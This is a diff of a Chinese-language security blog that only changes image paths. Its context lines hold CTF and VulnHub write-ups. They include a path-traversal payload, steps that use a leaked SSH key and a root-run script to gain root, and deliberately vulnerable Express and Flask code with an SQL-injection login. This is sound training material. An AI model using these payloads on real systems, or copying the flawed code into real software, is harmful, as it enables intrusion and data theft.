@@ -271,14 +271,14 @@ mjx-container[display="true"] + br {
       
         <p>內容會慢慢更新…筆記整理中</p>
 <h3 id="Web-mikufanpage"><a href="#Web-mikufanpage" class="headerlink" title="Web/mikufanpage"></a>Web/mikufanpage</h3><p>url: <a target="_blank" rel="noopener" href="https://mikufanpage.web.osugaming.lol/">https://mikufanpage.web.osugaming.lol/</a></p>
-<p>這題在察看網頁後，看不出什麼，題目沒有提供太多有用訊息，但有給個網頁的建置檔案<br><img src="img/osu2.png" alt="osu"></p>
+<p>這題在察看網頁後，看不出什麼，題目沒有提供太多有用訊息，但有給個網頁的建置檔案<br><img src="/img/osu2.png" alt="osu"></p>
 <p>所以在查看網頁原始碼後會注意到 <code>app.js</code> 的內容寫到，僅限制讀取 <code>img</code> 目錄下的 <code>.png</code> 及 <code>.jpg</code><br>意味者須要想個辦法去繞過這限制</p>
 <p>題外話，如果想把當前他給的網頁原始碼的檔案建立起來</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop/mikufanpage]</span><br><span class="line">└─# npm init</span><br><span class="line">Command &#x27;npm&#x27; not found, but can be installed with:</span><br><span class="line">apt install npm</span><br><span class="line">Do you want to install it? (N/y)y</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~kali/Desktop/mikufanpage]</span><br><span class="line">└─# npm install express --save</span><br><span class="line"></span><br><span class="line">added 64 packages, and audited 65 packages in 2s</span><br><span class="line"></span><br><span class="line">12 packages are looking for funding</span><br><span class="line">  run `npm fund` for details</span><br><span class="line"></span><br><span class="line">found 0 vulnerabilities</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[~kali/Desktop/mikufanpage]</span><br><span class="line">└─# node app.js               </span><br><span class="line">mikufanpage running on port 3000</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>(); </span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = process.<span class="property">env</span>.<span class="property">PORT</span> ?? <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">  </span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">(<span class="params">err</span>) =&gt;</span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(!err) </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mikufanpage running on port &quot;</span>+ <span class="variable constant_">PORT</span>) </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Err &quot;</span>, err); </span><br><span class="line">&#125;); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/image&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">path</span>.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>] === <span class="string">&quot;png&quot;</span> || req.<span class="property">query</span>.<span class="property">path</span>.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>] === <span class="string">&quot;jpg&quot;</span>) &#123; <span class="comment">// only allow images</span></span><br><span class="line">        res.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(<span class="string">&#x27;./img/&#x27;</span> + req.<span class="property">query</span>.<span class="property">path</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Access Denied&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>我們可以透過網頁也就是 <code>index.html</code> 內容中有寫到目前在輪流播放的圖片存取位置<br><img src="img/osu3.png" alt="osu"></p>
+<p>我們可以透過網頁也就是 <code>index.html</code> 內容中有寫到目前在輪流播放的圖片存取位置<br><img src="/img/osu3.png" alt="osu"></p>
 <p><code>/image?path=</code> 是個不錯的利用點，讓我想到應該可以利用LFI漏洞將flag.txt噴出來<br>之所以知道flag.txt是在img目錄下是因為題目提供的網頁原始檔中他們放在img目錄下</p>
-<p><img src="img/osu4.png" alt="osu"></p>
+<p><img src="/img/osu4.png" alt="osu"></p>
 <p>開啟burp攔截封包並對url進行測試，其實在測了幾個後發現，常見的做法可能是</p>
 <ul>
 <li>flag.txt.png</li>
@@ -288,7 +288,7 @@ mjx-container[display="true"] + br {
 <ul>
 <li>miku1.jpg../../../img/flag.txt</li>
 </ul>
-<p><img src="img/osu1.png" alt="osu"></p>
+<p><img src="/img/osu1.png" alt="osu"></p>
 <ul>
 <li>osu{miku<em>miku_miku_miku_miku_miku_miku_miku</em>….}</li>
 </ul>
@@ -307,8 +307,8 @@ mjx-container[display="true"] + br {
 </ul>
 <hr>
 <h3 id="Web-when-you-dont-see-it"><a href="#Web-when-you-dont-see-it" class="headerlink" title="Web/when-you-dont-see-it"></a>Web/when-you-dont-see-it</h3><p>題目說在他的profile中有藏flag<br><a target="_blank" rel="noopener" href="https://osu.ppy.sh/users/11118671">https://osu.ppy.sh/users/11118671</a></p>
-<p>找了一下，在 F12 &gt; Sources &gt; users &gt; 11118671<br>全域搜尋下找到了flag<br><img src="img/osu6.png" alt="osu"></p>
-<p>然後拿去 base64 decode<br><img src="img/osu5.png" alt="osu"></p>
+<p>找了一下，在 F12 &gt; Sources &gt; users &gt; 11118671<br>全域搜尋下找到了flag<br><img src="/img/osu6.png" alt="osu"></p>
+<p>然後拿去 base64 decode<br><img src="/img/osu5.png" alt="osu"></p>
 <ul>
 <li>osu{ok_u_see_me}</li>
 </ul>
@@ -393,7 +393,7 @@ mjx-container[display="true"] + br {
 <li><p>Network address translation → 分配位址</p>
 <ul>
 <li><p>Private IP Address</p>
-<p><img src="img/Net_Untitled.png" alt="Untitled"></p>
+<p><img src="/img/Net_Untitled.png" alt="Untitled"></p>
 </li>
 </ul>
 </li>
@@ -460,7 +460,7 @@ mjx-container[display="true"] + br {
 </li>
 <li>三向握手完成，連線就建立了，兩個設備就準備好交換資料了</li>
 <li><p>握手期間交換的序號用於確保資料以正確的順序發送和接收</p>
-<p><img src="img/Net_Untitled1.png" alt="Untitled1"></p>
+<p><img src="/img/Net_Untitled1.png" alt="Untitled1"></p>
 </li>
 </ul>
 </li>
@@ -566,7 +566,7 @@ mjx-container[display="true"] + br {
 </ul>
 <h2 id="Subnetting"><a href="#Subnetting" class="headerlink" title="Subnetting"></a>Subnetting</h2><p>七秒子網劃分：  <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=ZxAwQB8TZsM">https://www.youtube.com/watch?v =ZxAwQB8TZsM</a></p>
 <p>子網路指南：  <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1ETKH31-E7G-7ntEOlWGZcDZWuukmeHFe/view">https ://drive.google.com/file/d/1ETKH31-E7G-7ntEOlWGZcDZWuukmeHFe/view</a></p>
-<p><img src="img/Net_Untitled2.png" alt="Untitled2"></p>
+<p><img src="/img/Net_Untitled2.png" alt="Untitled2"></p>
 <ul>
 <li>網路劃分為更小的子網路（稱為子網路）的過程</li>
 <li>有效地使用 IP 位址並促進網路管理和路由。子網路劃分通常用於 IPv4 網路</li>
@@ -637,48 +637,48 @@ mjx-container[display="true"] + br {
 <p><a target="_blank" rel="noopener" href="https://falconspy.medium.com/infosec-prep-oscp-vulnhubwalkthrough-a09519236025">InfoSec Prep: OSCP VulnhubWalkthrough</a></p>
 <hr>
 <p>機器開啟後</p>
-<p><img src="img/oscpvou_Untitled.png" alt="Untitled"></p>
+<p><img src="/img/oscpvou_Untitled.png" alt="Untitled"></p>
 <p>用另一台kali的nmap</p>
 <p><code>nmap -sV -A -v 192.168.32.128</code></p>
-<p><img src="img/oscpvou_Untitled_1.png" alt="Untitled"></p>
+<p><img src="/img/oscpvou_Untitled_1.png" alt="Untitled"></p>
 <p>可以看到一些重要資訊</p>
 <ul>
 <li>22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</li>
 <li><p>80/tcp open http Apache httpd 2.4.41 ((Ubuntu))</p>
 <ul>
 <li><p>主頁面可以看到oscp是該機器的用戶</p>
-<p><img src="img/oscpvou_Untitled_2.png" alt="Untitled"></p>
+<p><img src="/img/oscpvou_Untitled_2.png" alt="Untitled"></p>
 </li>
 <li><p>/secret.txt</p>
-<p><img src="img/oscpvou_Untitled_3.png" alt="Untitled"></p>
+<p><img src="/img/oscpvou_Untitled_3.png" alt="Untitled"></p>
 <p>注意到這檔案，是base64加密過的</p>
-<p><img src="img/oscpvou_Untitled_4.png" alt="Untitled"></p>
+<p><img src="/img/oscpvou_Untitled_4.png" alt="Untitled"></p>
 <p>這看起來像是id_rsa的文件內容</p>
 <p><code>cat secret.txt| base64 -d &gt; id_rsa</code></p>
 <p>用這個登入ssh</p>
 <p><code>ssh oscp@192.168.32.128 -i id_rsa</code></p>
-<p><img src="img/oscpvou_Untitled_5.png" alt="Untitled"></p>
+<p><img src="/img/oscpvou_Untitled_5.png" alt="Untitled"></p>
 <p>接下來查看/bin/bash的權限並直接切換用戶到root</p>
-<p><img src="img/oscpvou_Untitled_6.png" alt="Untitled"></p>
+<p><img src="/img/oscpvou_Untitled_6.png" alt="Untitled"></p>
 <p>我們在oscp的用戶下有個檔案</p>
-<p><img src="img/oscpvou_Untitled_7.png" alt="Untitled"></p>
+<p><img src="/img/oscpvou_Untitled_7.png" alt="Untitled"></p>
 <p>當查看/etc/systemd/system/ip-update.service</p>
-<p><img src="img/oscp_vouUntitled_8.png" alt="Untitled"></p>
+<p><img src="/img/oscp_vouUntitled_8.png" alt="Untitled"></p>
 <p>由於不存在用戶信息，我們知道該<code>ip</code>腳本是以 root 身份運行的。由於該腳本位於 oscp 用戶目錄中，我們可以重命名當前腳本並創建我們自己的腳本，該腳本將以 root 身份運行。</p>
 </li>
 </ul>
 </li>
 </ul>
 <p>在前面WordPress網頁中，有說到flag在/root/中，列出目錄下所有文件，並重命名一個IP文件</p>
-<p><img src="img/oscpvou_Untitled_9.png" alt="Untitled"></p>
-<p><img src="img/oscpvou_Untitled_10.png" alt="Untitled"></p>
+<p><img src="/img/oscpvou_Untitled_9.png" alt="Untitled"></p>
+<p><img src="/img/oscpvou_Untitled_10.png" alt="Untitled"></p>
 <p>然後需要先改viminfo檔權限才可以用vim編輯ip檔案</p>
-<p><img src="img/oscpvou_Untitled_11.png" alt="Untitled"></p>
+<p><img src="/img/oscpvou_Untitled_11.png" alt="Untitled"></p>
 <p>OSCP的機器重開機，再去ls.txt內容會看到flag</p>
-<p><img src="img/oscpvou_Untitled_12.png" alt="Untitled"></p>
+<p><img src="/img/oscpvou_Untitled_12.png" alt="Untitled"></p>
 <p>現在知道文件名稱了再改一下腳本，並重啟VM，到oscp的用戶下就會看到flag</p>
-<p><img src="img/oscpvou_Untitled_13.png" alt="Untitled"></p>
-<p><img src="img/oscpvou_Untitled_14.png" alt="Untitled"></p>
+<p><img src="/img/oscpvou_Untitled_13.png" alt="Untitled"></p>
+<p><img src="/img/oscpvou_Untitled_14.png" alt="Untitled"></p>
 
       
     </div>
@@ -734,9 +734,9 @@ mjx-container[display="true"] + br {
       
         <p>Take a look at ConnectWind’s internal employee portal. In addition to company policies &amp; HR information, I heard it also stores flags.</p>
 <p>Can you access the protected employee portal without knowing the password and steal the flag?</p>
-<p><img src="img/metactfimage.png" alt="image.png"></p>
+<p><img src="/img/metactfimage.png" alt="image.png"></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://metaproblems.com/71c5b42eb77639d5224be5589123de30/employee_portal.php</span><br></pre></td></tr></table></figure>
-<p><img src="img/metactfimage1.png" alt="image.png"></p>
+<p><img src="/img/metactfimage1.png" alt="image.png"></p>
 <hr>
 <p>We recovered this executable from a device, but we can’t figure out how to make the program run. We suspect the code was compiled for a system with a different CPU architecture.</p>
 <p>Can you figure out which architecture it was compiled for? The flag is the name of the architecture. You don’t need to run or take apart the executable.</p>
@@ -752,7 +752,7 @@ mjx-container[display="true"] + br {
 <hr>
 <p>My friend wanted to communicate using a secret cipher.</p>
 <p>He gave me the message RKPUYPFCIAKKJMYZZJT along with this wheel:</p>
-<p><img src="img/metactfimage2.png" alt="image.png"></p>
+<p><img src="/img/metactfimage2.png" alt="image.png"></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line"></span><br><span class="line">outer = string.ascii_uppercase + <span class="string">"{}"</span></span><br><span class="line">inner = <span class="string">"COSDHG{QNFUVWLEZYXPTKMR}ABJI"</span></span><br><span class="line"></span><br><span class="line">msg = <span class="string">"RKPUYPFCIAKKJMYZZJT"</span></span><br><span class="line"></span><br><span class="line">def decrypt(msg, outer, inner):</span><br><span class="line">    <span class="keyword">for</span> rotation <span class="keyword">in</span> range(len(outer)):</span><br><span class="line">        rotated_inner = inner[rotation:] + inner[:rotation]</span><br><span class="line">        lookup = dict(zip(outer, rotated_inner))</span><br><span class="line">        decrypted_msg = <span class="string">""</span>.<span class="built_in">join</span>(lookup[c] <span class="keyword">for</span> c <span class="keyword">in</span> msg)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">'META'</span> <span class="keyword">in</span> decrypted_msg:</span><br><span class="line">            <span class="built_in">print</span>(f<span class="string">"Rotation {rotation}: {decrypted_msg}"</span>)</span><br><span class="line">decrypt(msg, outer, inner)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>Rotation 4: METACTF{WHEELYCOOL}</p>
@@ -763,20 +763,20 @@ mjx-container[display="true"] + br {
 <p>This tool (or a similar one) might come in handy.</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">We intercepted some communications by an enemy cyber actor, and we believe it<span class="string">'s possible to break their encryption scheme. We know they'</span>re using some form of a one-time pad, but fatally, they<span class="string">'re reusing the key across all their messages. We know the group likes classical books, with one of the actors recently being into Charles Dickens, but we don'</span>t have much <span class="keyword">else</span> to go off of. Please <span class="built_in">break</span> these communications to get the password they<span class="string">'ve sent each other!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Encrypted message 1 (hex):</span></span><br><span class="line"><span class="string">e0261e3f44788a669ff87710eb149eba87a9b7ce2abb92b45e862de035485ad02aff59e980e5b0db1657332f202bebb0abe591b6137d93854cddd82ad670caf50431b73fa787741a348e8166791c39ef396c658c1313dac4ac82ff5a948211c9503bb9318376d1a61f45c277ac6ac62e4cdfbf3a40753206b661e4bf4e99575d4253c8feaa6b43eb5b8fc415fa2173c497f0e2573671613aa04d72b5daa5aafcb7fd45850739053965c49016276c733b724e67f976b9ee61a633f95b1286435dc491cec07baf506949f97a56c20870c0b6cfe0e81a96bec40628e407e25d573a35f7c3f9f1af533a363e65b87e7b3948f0d138d2f9e8678e9fc38c83e4202cf00570c386d5fc334314936148efc4fc27db06315d9131fa0455d31e4349a7343ed87f152ace3a1f62552ba00bc36228ef5da754239273453634bdab2a4a6f3c12e3c94b91bbf7c521ca22ff84cb7aac3083a2a252fab727c4f1fcef43d7c32b4f2ba70b32eeefabd1da10980932d3af79c0f8c069ed09f73ef69793ddf7256b6c9473be6ca7907b065e0a0965418fc2daf03abf308c55639d827ea41b4a9a1874b41bfc2cf809083593bda5de46e306e142f9c65716eb1f1670bb8a4367b1920fb5490387b64c9ad105365dd9e812a044a70bfcc5fa6d01ae325aff2db252307c01d54f2d6c8764651a90ab69eb8146ead1c318a952fcd4648764e450f84e7cca18ddb8f0bd0f405a320a3ed8ce79bf0767ea1ed2915664082ad3d7671b59b79b7d9d5a7948952923fc2537fd14a40ac98344fe927adfbf805b39974fb525aeb7dceabcf58c363c04232ede54cfc0f02169ac06293e322d1ccceb1927f3a1c70328226b4dd812ee33df05a1728769167a25e245b58eb5ada6b26b71b0d7cdae8115d950a1824b445fb197e20318d61b69385ff5cc10600419209239735105f3feb09dfcad6b3a42aba213cb997e5cce2e04df6299fefaea04d9fd17819fd24477cf15d1fd0644cafed146175753a166a9344be3a8163fe855c71017b041ef49e2eff087d9de753b4f1518ca989b5f326407f82b0f98ecbdc9b900c075bed589c348d0e0b623658a31ddec507abce8518add4d9b00a847354f000da85303f704e722277102296f2bc62e6a4374d1f9f0ea56923ab84cade47ac393be38adfc67a3db39d29d08e6bc86ab987266618476daba54c678ae48658dc44e37974732347e95448d4b3fd88473df9875304d941f4009accace8bb696c6f266faf681a77b214a35312584c0ef835a0fea60e8eb0b3155908f97601a8596ba846f88ad63c197b266e2730d0b58e3c43262303528e1dbef86</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Encrypted message 2 (hex):</span></span><br><span class="line"><span class="string">ee205b29512bc37692fc7706e1479fe98defe3d22aa5d79f3df464ff70461bd765ab54e2c3e0a6d91103722c2a2bf0bfe6ef97e8137788c856c9c563c179dbbc0a38a133e88f3b1a7d94912e671070eb3d23619e0951c2c9e9d6f11d9acc11d8502abe3f9b3fd5ab5652d424f42bc33105c6b96901633516e225b4990d92165c0407cff7aa225fe2028fcc0fa37661d2d4f6ef46367d7f75b74d37facbeab1feb0af429406751f24728bd55f2724617a592141b178fce424ae33b6595d874218fad8ddc06eed506153a02d58d7086bdda1cff6e31897a8da5222e607cb5956223af5d5f9f1af533a362471b82a2f3348f0cb25d0fff573c792c9c9cbff3f69be577cd6cd8ebd320a07937057b8e4b237d1547a5c9866be0e48c65f455dab79309d3c0429cf680971532cab16df7266ee0fac542b9972006120bda77e58667013ecca4b92b1a3de27c920ab8ec772a46287e0b854a2b73bc4a8abf854c7902f0f67e51929a7c8eb9c9e0a9f1e3487fb65ceaca865f858e170bcde8addf9724f708824be79e790700c43431d654283c49fe721bf338c4963bbd673af0a1894097933ff4831fe40087d91aaa28107f00ba40be7835117e15b506ea88a1734aede08b75e0dcb9600939d513c5dd9eb05ab53ab0befc5f36706e73c1ea964b61a37614dc3003760d36323558cad3aae9940ef82da11bb48af95629c63e50eb153618818dda2ebbe03410e341c77c3c93ab71f34be14d68c186d4778d9da67525db79e35ce1c6252d06e2ffc2f63f708f01f8ad117f4c45a93e7c85d22d053a960e7b089edb6f28c33680f306b8959d9c2a23063ac1a2a70356205d4ef4b3ee1bdda54283e6314857d9406c501a772cb675d2814aa41b595bdb0b2e5736aa09f84bc8134dd56a7a43f6845a5c5b20f2392087d2e4da1c7191f441867a57b22411ec0fce883b4f8782409a7cb5bc9d52a46ce6f13df3094f1fca14bd0a826cf8cd10560c45bd1fa014ed6bad13b22760ca14ea92c47e3bb163ce9448f4302f15ffa1beaecf099d0c8217a431e57c0988344777501bd7c0998ecf8dab90bc46fbf9488c70bd3a3e46c72c530bfd9205deeba718c980c9a02a848674d011ba1194d991ee72627770d6c7864c72f3e4168c0aabfed479222bf1fe0fe36c093ba32adb567ae9a2687910efabcc8ead6057a618461ddb100d878b05f36d9c34d37934e24600d824a975a6dc79a658c896f2308814a5b1afec38fca979bdaf264fbfcd5b37d3e51703661c194f7904b5cfb66f5a50f2d1b8d93d86b0ccb87a08023d8bb75c7d0</span></span><br></pre></td></tr></table></figure>
 <p><a target="_blank" rel="noopener" href="https://toolbox.lotusfa.com/crib_drag/">https://toolbox.lotusfa.com/crib_drag/</a></p>
-<p><img src="img/metactfimage3.png" alt="image.png"></p>
-<p><img src="img/metactfimage4.png" alt="image.png"></p>
+<p><img src="/img/metactfimage3.png" alt="image.png"></p>
+<p><img src="/img/metactfimage4.png" alt="image.png"></p>
 <p>可以大概猜測是在某段文字中的其中的文字，找到題目說的那位作者，他應該有個書籍包含了缺失的內容</p>
-<p><img src="img/metactfimage5.png" alt="image.png"></p>
+<p><img src="/img/metactfimage5.png" alt="image.png"></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">It was the best of <span class="built_in">times</span>, it was the worst of <span class="built_in">times</span>, it was the age of wisdom, it was the age of foolishness, it was the epoch of belief, it was the epoch of incredulity, it was the season of Light, it was the season of Darkness, it was the spring of hope, it was the winter of despair, we had everything before us, we had nothing before us, we were all going direct to Heaven, we were all going direct the other way—<span class="keyword">in</span> short, the period was so far like the present period, that some of its noisiest authorities insisted on its being received, <span class="keyword">for</span> good or <span class="keyword">for</span> evil, <span class="keyword">in</span> the superlative degree of comparison only. There were a king with a large jaw and a queen with a plain face, on the throne of England; there were a king with a large jaw and a queen with a fair face, on the throne of France. In both countries it was clearer than crystal to the lords of the State preserves of loaves and fishes, that things <span class="keyword">in</span> general were settled <span class="keyword">for</span> ever.</span><br></pre></td></tr></table></figure>
 <p>大概一片猜測之後</p>
-<p><img src="img/metactfimage6.png" alt="image.png"></p>
+<p><img src="/img/metactfimage6.png" alt="image.png"></p>
 <blockquote>
 <p>MetaCTF{cr1b_dr4gg1ng_7h3_b00k_c1ph3r}</p>
 </blockquote>
 <hr>
 <p>My favorite coffee shop is opening a new website, but they locked it behind a combination lock page! Can you hack the page to get access early?</p>
 <p>Access the site <a target="_blank" rel="noopener" href="http://host5.metaproblems.com:7510/">here</a></p>
-<p><img src="img/metactfimage7.png" alt="image.png"></p>
+<p><img src="/img/metactfimage7.png" alt="image.png"></p>
 <hr>
 <p>StackSmashers<br>Welcome to the buffer overflow challenge!</p>
 <p>What is a Buffer Overflow?<br>When a program is executed, the CPU processes instructions stored in memory. A stack is an area within memory that is used to store variables, manage function calls, and help control the flow of the program.</p>
@@ -789,7 +789,7 @@ mjx-container[display="true"] + br {
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Submit</span><br><span class="line">Memory layout before input:</span><br><span class="line">0000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">0010  00  </span><br><span class="line"></span><br><span class="line">Enter some data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line">Memory layout after input:</span><br><span class="line"></span><br><span class="line">0000  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">0010  41       </span><br><span class="line"></span><br><span class="line">Congratulations! You<span class="string">'ve successfully performed a buffer overflow! Here'</span>s your flag: MetaCTF{h4ving_fun_m4king_pr0f1t}</span><br><span class="line">                                       .</span><br></pre></td></tr></table></figure>
 <p>緩衝區溢出就是…丟一堆字串塞下去就對ㄌ</p>
-<p><img src="img/metactfimage8.png" alt="image.png"></p>
+<p><img src="/img/metactfimage8.png" alt="image.png"></p>
 <blockquote>
 <p>MetaCTF{h4ving_fun_m4king_pr0f1t}</p>
 </blockquote>
@@ -798,14 +798,14 @@ mjx-container[display="true"] + br {
 <p>The flag is in the flag.png file. Find it!</p>
 <p>Hint: see if you can isolate the RPC requests that are responsible for writing files to the file system, and pull out the payload of the one that writes flag.png. Copy Bytes as Raw Binary might be helpful, but there are other valid approaches too.</p>
 <p>找到這邊有寫入的部分</p>
-<p><img src="img/metactfimage9.png" alt="image.png"></p>
+<p><img src="/img/metactfimage9.png" alt="image.png"></p>
 <p>如果開啟下面設定能看到更多細節</p>
-<p><img src="img/metactfimage10.png" alt="image.png"></p>
-<p><img src="img/metactfimage11.png" alt="image.png"></p>
+<p><img src="/img/metactfimage10.png" alt="image.png"></p>
+<p><img src="/img/metactfimage11.png" alt="image.png"></p>
 <p>PNG檔案的開頭會有一個特定的簽名，89 50 4E 47 0D 0A 1A 0A</p>
-<p><img src="img/metactfimage12.png" alt="image.png"></p>
-<p><img src="img/metactfimage13.png" alt="image.png"></p>
-<p><img src="img/metactfimage14.png" alt="image.png"></p>
+<p><img src="/img/metactfimage12.png" alt="image.png"></p>
+<p><img src="/img/metactfimage13.png" alt="image.png"></p>
+<p><img src="/img/metactfimage14.png" alt="image.png"></p>
 <blockquote>
 <p>MetaCTF{th3_n3tw0rk_is_th3_c0mput3r}</p>
 </blockquote>
@@ -813,13 +813,13 @@ mjx-container[display="true"] + br {
 <p>My friend went camping near some beautiful lake the other day and sent me a photo, but they refuse to tell me where it was!</p>
 <p>Can you help me figure out the name of that lake?</p>
 <p>Simply enter the name of the lake as the flag. It does not need to be in the MetaCTF{} format.</p>
-<p><img src="img/metactfimage15.png" alt="image.png"></p>
-<p><img src="img/metactfimage16.png" alt="image.png"></p>
+<p><img src="/img/metactfimage15.png" alt="image.png"></p>
+<p><img src="/img/metactfimage16.png" alt="image.png"></p>
 <hr>
 <p>I’m trying to log into my online crypto wallet, but I forgot my password! There’s no password reset feature, and I can’t reach support.</p>
 <p>Can you help me log in and get the flag? My username is jim404.</p>
 <p>You can download the source code here. Looks like there might be an issue with how the user input is injected into the SQL query.</p>
-<p><img src="img/metactfimage17.png" alt="image.png"></p>
+<p><img src="/img/metactfimage17.png" alt="image.png"></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, render_template</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sqlite3</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">os.chdir(os.path.dirname(os.path.realpath(__file__)))</span><br><span class="line"></span><br><span class="line">db = sqlite3.connect(<span class="string">"db.sqlite"</span>, check_same_thread=False)</span><br><span class="line">db_cursor = db.cursor()</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">@app.route(<span class="string">'/index.html'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def index():</span><br><span class="line">    <span class="built_in">return</span> render_template(<span class="string">"index.html"</span>)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/login'</span>, methods=[<span class="string">'POST'</span>])</span><br><span class="line">def login():</span><br><span class="line">    data = request.json</span><br><span class="line">    username = data.get(<span class="string">"username"</span>, <span class="string">"-"</span>)</span><br><span class="line">    password_hash = hashlib.md5(data.get(<span class="string">"password"</span>, <span class="string">"-"</span>).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    db_error = <span class="string">""</span></span><br><span class="line">    try:</span><br><span class="line">        query = <span class="string">"SELECT username, public_btc_address, private_btc_key, balance FROM users WHERE username='"</span> + username + <span class="string">"' AND password_hash='"</span> + password_hash + <span class="string">"';"</span></span><br><span class="line">        result = db_cursor.execute(query)</span><br><span class="line">        user_data = result.fetchone()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        user_data = None</span><br><span class="line">        db_error = str(e)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user_data is None:</span><br><span class="line">        <span class="built_in">return</span> {</span><br><span class="line">            <span class="string">"error"</span>: True,</span><br><span class="line">            <span class="string">"message"</span>: <span class="string">"Login failed. Please try again."</span>,</span><br><span class="line">            <span class="string">"debug"</span>: query,</span><br><span class="line">            <span class="string">"debug_msg"</span>: db_error,</span><br><span class="line">        }</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> {</span><br><span class="line">            <span class="string">"error"</span>: False,</span><br><span class="line">            <span class="string">"message"</span>: <span class="string">"Login successful."</span>,</span><br><span class="line">            <span class="string">"username"</span>: user_data[0],</span><br><span class="line">            <span class="string">"public_btc_address"</span>: user_data[1],</span><br><span class="line">            <span class="string">"private_btc_key"</span>: user_data[2],</span><br><span class="line">            <span class="string">"balance"</span>: user_data[3]</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">app.run(debug=True, host=<span class="string">"0.0.0.0"</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <ul>
 <li><p>The SQL query is constructed like this:</p>
@@ -830,12 +830,12 @@ mjx-container[display="true"] + br {
 </li>
 <li>The application does not validate or sanitize input, so malicious input could manipulate the SQL query to bypass authentication.</li>
 </ul>
-<p><img src="img/metactfimage18.png" alt="image.png"></p>
-<p><img src="img/metactfimage19.png" alt="image.png"></p>
+<p><img src="/img/metactfimage18.png" alt="image.png"></p>
+<p><img src="/img/metactfimage19.png" alt="image.png"></p>
 <hr>
 <p>I need to get into this <a target="_blank" rel="noopener" href="https://metaproblems.com/d36b89698928224c03f29aa2d2cb5544/luggage.zip">archive</a>, but I forgot the password for it as well. All I remember is, it’s the same 4-digit pin I used on my luggage lock…</p>
